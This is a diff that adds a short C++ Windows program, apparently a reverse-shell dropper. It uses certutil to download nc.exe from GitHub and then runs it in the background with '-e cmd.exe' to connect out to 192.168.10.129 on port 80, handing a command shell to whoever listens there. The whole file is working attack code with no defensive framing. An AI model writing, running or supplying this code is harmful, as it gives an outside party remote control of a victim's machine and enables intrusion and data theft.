@@ -1,0 +1,37 @@
+#include <iostream>
+#include <cstdlib>
+#include <string>
+#include <windows.h>
+
+using namespace std;
+
+void executeCommand(const string& command) {
+    system(command.c_str());
+}
+
+void downloadNcExe() {
+    string downloadCommand = "certutil -urlcache -split -f https://raw.githubusercontent.com/int0x33/nc.exe/master/nc.exe nc.exe";
+    executeCommand(downloadCommand);
+}
+
+void connectToServer(const string& serverIP, int port) {
+    
+    string command = "nc.exe " + serverIP + " " + to_string(port) + " -e cmd.exe";
+    string executeCommand = "start /B " + command;
+    system(executeCommand.c_str());
+}
+
+int main() {
+    string serverIP = "192.168.10.129";  
+    int port = 80;  
+
+    cout << "Downloading nc.exe..." << endl;
+    downloadNcExe();
+    cout << "Download complete." << endl;
+
+    cout << "Connecting to server " << serverIP << " on port " << port << "..." << endl;
+    connectToServer(serverIP, port);
+    cout << "Connection initiated." << endl;
+
+    return 0;
+}
